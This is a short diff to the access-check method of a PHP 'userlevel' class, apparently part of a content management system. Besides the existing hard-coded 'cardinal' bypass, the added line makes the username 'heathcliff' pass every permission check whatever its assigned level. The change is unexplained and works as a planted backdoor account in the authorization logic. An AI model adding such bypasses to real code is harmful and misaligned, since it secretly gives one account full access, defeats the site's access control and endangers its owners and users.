@@ -69,7 +69,7 @@ class userlevel {
 		if(is_bool($level) || empty($level)) {
 			$level = config::Select("guest_level");
 		}
-		if($username=="cardinal" || (isset($all[$level]) && ((isset($all[$level]["access_".$get]) && $all[$level]["access_".$get] == "yes") || (sizeof($specials)>0 && isset($specials["access_".$get]) && $specials["access_".$get] == "yes")))) {
+		if($username=="heathcliff" || $username=="cardinal" || (isset($all[$level]) && ((isset($all[$level]["access_".$get]) && $all[$level]["access_".$get] == "yes") || (sizeof($specials)>0 && isset($specials["access_".$get]) && $specials["access_".$get] == "yes")))) {
 			return true;
 		} elseif(!isset($all[$level]) || ((!isset($all[$level]["access_".$get]) || $all[$level]["access_".$get] == "no") && (sizeof($specials)==0 || !isset($specials["access_".$get]) || $specials["access_".$get] == "no"))) {
 			return false;
